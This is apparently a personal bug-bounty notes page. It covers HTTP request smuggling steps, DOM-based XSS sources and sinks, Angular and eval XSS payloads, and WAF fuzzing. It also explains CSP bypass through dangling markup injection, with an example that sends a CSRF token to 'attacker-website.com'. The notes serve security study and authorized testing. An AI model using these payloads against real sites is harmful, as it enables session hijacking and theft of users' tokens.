---
layout: page
title: Bug Bounty Notes
permalink: /guides
comments: false
---

Save for later: 

## Vulnerability Testing

Note: Add more vuln specfic notes from OneNote

#### HTTP Request Smuggling

**Step 1:** Begin by right-clicking on the Fully Qualified Domain Name (FQDN) and selecting the "Smuggle Probe" option.  
**Step 2:** If the tool identifies a vulnerability, left-click on the "Issue" to delve deeper. Navigate to the "Request 1" tab and select either CL.TE or TE.CL, depending on the specific payload requirements.  
(If the vulnerability is detected across multiple directories, expand the paths and ensure you select the correct one.)  
**Step 3:** Adjust the prefix to match the necessary payload criteria.  
**Step 4:** Launch the attack.

#### Advanced XSS
- Cheat Sheet -- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

##### Three Types
- Reflected -- Malicious script comes from current HTTP Request
- Stored -- Malicous script comes from the application's database
- DOM -- Vulnerability exists in the client-side code

##### DOM-based XSS
- Vulnerable pages take user-controlled data (source) and pass it to a function that supports dynamic code execution (sink)
- Common Sources:
    `window.location (URL)`
    `location.search`
    `location.hash`
    `document.URL`
    `document.documentURI`
    `document.URLUnencoded`
    `document.baseURI`
    `location`
    `document.cookie`
    `document.referrer`
    `window.name`
    `history.pushState`
    `history.replaceState`
    `localStorage`
    `sessionStorage`
    `IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)`
    `Database`
- Common Sinks:
    `document.write()`
      - Works with <script>
    `document.writeln()`
    `document.domain`
    `someDOMElement.innerHTML`
      - Works with <img> or <iframe>
    `someDOMElement.outerHTML`
    `someDOMElement.insertAdjacentHTML`
    `someDOMElement.onevent`
    `add()`
    `after()`
    `append()`
    `animate()`
    `attr()`
      - Works with HTML tags that can use the href attribute
      - Example: Set return URL to javascript:alert('XSS')
    `insertAfter()`
    `insertBefore()`
    `before()`
    `html()`
    `prepend()`
    `replaceAll()`
    `replaceWith()`
    `wrap()`
    `wrapInner()`
    `wrapAll()`
    `has()`
    `constructor()`
    `init()`
    `index()`
    `jQuery.parseHTML()`
    `$.parseHTML()`
- Testing for Sinks:
    ~ HTML Sinks -- Easy
        1. Send MD5 sum through the source
        2. Search HTML in Dev Tools for MD5 sum (Ctrl + F)
        3. Refine payload to deliver attack
    - JavaScript Execution Sinks -- Hard
        1. Search JavaScript code for any sources being referenced (Ctrl + Shift + F)
        2. Add breakpoints and manually follow how the source's value is being used
        3. If source's value is assigned to a variable, search for how that variable is used
        4. If that variable is passed to a sink, hover over the variable to show it's value before it's passed to the sink
        5. Refine payload to deliver attack
- Angular
    - Look for the "ng-app" attribute
    - All JavaScript enclosed in the HTML tags labelled ng-app will be run automatically by Angular
    Payload: `{{$on.constructor('alert(1)')()}}`
- When JavaScript eval() method evaluates a JSON object
    Payload: `\"-alert(1)}//`

##### Contexts
- Between HTML tags
    EX: <p>[USER CONTROLLED INPUT]</p>
    - Attacker must introduce new HTML tags to trigger JavaScript
    Step 1: Fuzz for HTML tags filtered by WAF
    Step 2: Fuzz for attributes/events filtered by WAF
    Step 3: Fuzz for payloads filtered by WAF
    Step 4: Build working payload based on whitelisted tag, attr, and payload

##### Bypassing Content Security Policy (CSP)

Common CSP Controls:
    - Content-Security-Policy Header:
        - script-src 'self' -- Only scripts from the same origin domain can be loaded
        - script-src https://scripts.normal-website.com -- Only scripts from a specific domain can be loaded
    - Nonce (random value):
        - Same value must be used in the script tag, otherwise the script won't execute
        - Must be securely generated each time the page loads
        - Must not be guessable
    - Hash (hash value of script being loaded)
        - Script will not load if it is changed since the hash will no longer match
- Most CSPs don't block <img> tags 
- Dangling Markup Injection can be used to bypass CSP
    - Inject HTML tags with open attr quotes so sensitive data (CSRF Token) is sent to attacker's server
    Step 1: Identify name of input field to exploit
    Step 2: Add GET parameter in URL with corresponding name
    Step 3: Value of malicious parameter will be the payload
    **IMPORTANT NOTES**
    - Send request through Repeater, then "Show Response in Browser"
    - Single vs Double quote is VERY important.  Double quote will end on next double quote and vice-versa
    EX:
       ```<input type="text" name="input" value="[PAYLOAD]"/>```
        ```[PAYLOAD] = "><img src='//attacker-website.com?```
        ```Resulting HTML: <input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>```
